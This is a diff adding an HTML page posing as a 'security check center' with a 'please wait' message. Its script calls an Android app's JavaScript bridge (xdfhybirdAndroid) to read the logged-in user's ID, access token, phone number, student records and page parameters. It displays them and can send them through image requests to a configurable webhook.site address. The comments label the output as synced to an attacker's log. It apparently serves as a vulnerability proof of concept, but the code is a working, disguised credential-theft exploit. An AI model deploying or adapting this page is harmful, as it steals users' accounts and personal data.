@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>安全检测中心</title>
+</head>
+<body style="font-family:sans-serif;font-size:14px;margin:16px">
+<h3>安全检测中，请稍候...</h3>
+<pre id="out" style="white-space:pre-wrap;font-size:11px;color:#222;background:#f6f6f6;padding:8px;border-radius:6px"></pre>
+
+<script>
+// ====== 可选：把它改成你在 https://webhook.site 创建的地址（含uuid），用于服务端日志留证 ======
+// 留空 = 只在屏幕显示（截图/录屏即为证据）
+var EXFIL_BASE = "";
+
+function show(t){ document.getElementById('out').textContent += t + "\n"; }
+function exfil(tag, val){
+  var d = String(val).substring(0, 4000);
+  show("[" + tag + "] " + d);
+  if (EXFIL_BASE) {
+    new Image().src = EXFIL_BASE + "?tag=" + encodeURIComponent(tag) + "&d=" + encodeURIComponent(d);
+  }
+}
+
+// 等待桥对象注入（正常在页面加载时已注入，轮询兜底）
+var tries = 0;
+function kick(){
+  tries++;
+  try {
+    if (!window.xdfhybirdAndroid) throw new Error("bridge not ready (try " + tries + ")");
+    // 1) 登录态凭据：userId + accessToken + 手机号 + 全部学员档案
+    var data = window.xdfhybirdAndroid.requireData();
+    exfil("requireData", data);
+    // 2) 容器启动参数回显（证明任意页面可读）
+    try { exfil("requirePageParam", window.xdfhybirdAndroid.requirePageParam()); } catch(e){}
+    show("=== 以上数据已同步至攻击者日志 ===");
+    return;
+  } catch(e){
+    show("[" + tries + "] " + e);
+    if (tries < 10) setTimeout(kick, 500);
+    else show("FAILED: 桥不可达");
+  }
+}
+kick();
+</script>
+</body>
+</html>
